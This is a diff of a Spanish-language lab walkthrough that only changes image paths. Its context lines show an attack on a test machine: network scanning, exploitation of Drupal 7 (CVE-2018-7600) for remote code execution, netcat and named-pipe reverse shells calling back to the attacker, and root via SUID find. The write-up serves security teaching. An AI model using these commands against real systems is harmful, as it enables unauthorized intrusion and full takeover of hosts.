@@ -57,7 +57,7 @@ arp-scan -I eth3 -l
 > - `-I`: interface: Especificamos la interfaz de red donde se enviarán solicitudes para identificar dispositivos.
 > - `-l`: Descubrimiento de dispositivos en nuestra subred local (--localnet).
 
-![Identifying the IP](./images/20260306192120.png)
+![Identifying the IP](images/20260306192120.png)
 
 
 La dirección IP de interés es la `192.168.1.169`. Realizamos una prueba de conectividad a través de `ping` para verificar que es posible entablar una conexión entre la máquina objetivo y la nuestra.
@@ -70,7 +70,7 @@ ping -c1 192.168.1.169 -R
 > - `-c1`: Especificamos que solo se envíe un paquete y se espere a recibirlo.
 > - `-R`: Solicitamos que se trace la ruta del paquete para observar si hay conexión directa o el paquete pasa por nodos durante el proceso (Los cuales pueden reducir el valor del TTL).
 
-![Testing the connection with the victim](./images/20260306195718.png)
+![Testing the connection with the victim](images/20260306195718.png)
 
 
 Podemos observar que la ruta de nuestra traza ICMP indica una conexión exitosa. Por otro lado, un valor del TTL cercano a  `64` suele implicar que nos enfrentamos a un OS `Linux/Unix` (Aunque esto no es una identificación definitiva).
@@ -96,7 +96,7 @@ nmap -p- --min-rate 5000 -Pn -n -oN nmap-scan 192.168.1.169
 >
 > Por otro lado, si los sistemas no soportan la recepción de grandes cantidades de paquetes, estos podrían saturar los sistemas temporalmente o el mismo escaneo podría dar falsos positivos/negativos.
 
-![Nmap Scan](./images/20260307102017.png)
+![Nmap Scan](images/20260307102017.png)
 
 ### Enumeración de Puertos
 
@@ -106,7 +106,7 @@ Observamos los puertos `22 (ssh), 80 (http), 111 (rpcbind) y el 57182 (Desconoci
 nmap -sV -p22,80,111,57182 -oN ports-enumeration 192.168.1.169
 ```
 
-![First port enumeration with -sV flag](./images/20260307103608.png)
+![First port enumeration with -sV flag](images/20260307103608.png)
 
 El resultado del escaneo ahora nos expone el apartado `VERSION`. A pesar de contener datos valiosos, es posible mejorar la calidad de estos a través de la flag `-sC`, gracias a la cual `Nmap` utilizará un conjunto predeterminado de `scripts de reconocimiento` para recabar aún más información:
 
@@ -116,7 +116,7 @@ nmap -p22,80,111,57182 -sCV -oN ports-enumeration 192.168.1.169
 
 >Es posible concatenar las flags `-sV y -sC`, resultando en `-sCV`.
 
-![Second port enumeration with -sCV flag](./images/20260307103859.png)
+![Second port enumeration with -sCV flag](images/20260307103859.png)
 
 Tras un análisis de la enumeración de puertos, podemos agrupar los resultados en la siguiente tabla:
 
@@ -140,14 +140,14 @@ A partir de la tabla podemos definir posibles vectores de ataques:
 
 En el puerto 80 se está ejecutando un servicio `http`, el cual tras visitarlo nos indica que - como ya se ha comentado - hace uso del CMS "`Drupal 7`": 
 
-![Home of the Drupal 7 web page](./images/20260307120546.png)
+![Home of the Drupal 7 web page](images/20260307120546.png)
 
 
 > En entornos de pentesting web es buena idea probar credenciales comunes, tales como `admin:admin` o `user:password`. Esto suele ser frecuente en sistemas antiguos y con mantenimiento irregular. 
 
 A pesar de que el sistema web sea antiguo, no posee credenciales comunes.  A pesar de ello, hay otro campo de interés: `Create new account`:
 
-![Identifying the admin account](./images/20260307121144.png)
+![Identifying the admin account](images/20260307121144.png)
 
 Observamos que `Drupal 7` nos indica que "`The name admin is already taken`". Esto nos podría ser de utilidad para probar nuevamente claves comunes, pero no es el caso. Por lo tanto, seguiremos con la enumeración de la página web.
 
@@ -164,7 +164,7 @@ Por lo tanto, al ser _`Drupal 7`_ una versión antigua, probablemente tenga alg�
 
 Una búsqueda rápida en Google nos arroja lo siguiente:
 
-![Gathering information about the SA-Core-2018-002 Vulnerability](./images/20260307122506.png)
+![Gathering information about the SA-Core-2018-002 Vulnerability](images/20260307122506.png)
 
 
 [Drupal - SA-Core-2018-002](https://www.drupal.org/sa-core-2018-002)
@@ -190,7 +190,7 @@ Tras haber descargado el exploit, podemos ejecutar la siguiente línea de comand
 python3 drupa7-CVE-2018-7600.py -c 'whoami' http://192.168.1.169/
 ```
 
-![Using the CVE-2018-7600 python exploit to get access](./images/20260307134239.png)
+![Using the CVE-2018-7600 python exploit to get access](images/20260307134239.png)
 
 
 De esta manera comprobamos que tenemos capacidad de ejecución de código remoto. Por lo tanto, para eficientar el proceso de explotación y escalada de privilegios, entablaremos una reverse shell:
@@ -215,7 +215,7 @@ python3 drupa7-CVE-2018-7600.py -c 'nc -e /bin/bash $IP 4444' http://192.168.1.1
 >
 > A pesar de ello, es posible entablar una reverse shell a través de `Named Pipes`: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $IP 4444 > /tmp/f`.
 
-![Listing the /var/www/hmtl content](./images/20260307135039.png)
+![Listing the /var/www/hmtl content](images/20260307135039.png)
 
 
 Listamos el contenido del directorio actual de trabajo. ¡Perfecto! Solo hay un pequeño detalle: Nuestra reverse shell no es interactiva. Comandos como `CTRL + C` nos cerrarán la consola, por decir un ejemplo.
@@ -237,7 +237,7 @@ export TERM=xterm
 
 Ahora ya tenemos una `shell completamente interactiva`:
 
-![Interactive Reverse Shell established](./images/20260307135813.png)
+![Interactive Reverse Shell established](images/20260307135813.png)
 
 ## Escalada de Privilegios
 
@@ -255,13 +255,13 @@ find / -perm -4000 -user root 2>/dev/null
 > - `-user root`: Especificamos que los archivos deben de pertenecerle al usuario root.
 > - `2>/dev/null`: Redigirimos los errores a /dev/null para ocultarlos y solo enfocarnos en las respuestas válidas.
 
-![Identifying the find binary with the SUID bit](./images/20260307141326.png)
+![Identifying the find binary with the SUID bit](images/20260307141326.png)
 
 ### Aprovechamiento del SUID de Find
 
 Dentro de todas las respuestas, es posible observar un SUID crítico: `/usr/bin/find`. Si buscamos en GFTOBins, vemos un comando crucial:
 
-![Using GFTOBins to get root privileges](./images/20260307142638.png)
+![Using GFTOBins to get root privileges](images/20260307142638.png)
 
 El `SUID` del binario `find` nos permite `ejecutar el intérprete de comandos (sh)` a través del siguiente comando:
 
@@ -275,7 +275,7 @@ find . -exec /bin/sh \; -quit
 
 > Es relevante destacar que el bit `SUID` en el comando `find` permite ejecutar los comandos posteriores (Como /bin/sh) con los privilegios del dueño del archivo, es decir, _`root`_.
 
-![Finally getting root privileges](./images/20260307141718.png)
+![Finally getting root privileges](images/20260307141718.png)
 
 Tenemos permisos de administrador! Para la última comprobación, podemos intentar leer la flag que se encuentra en el directorio `/root`: 
 
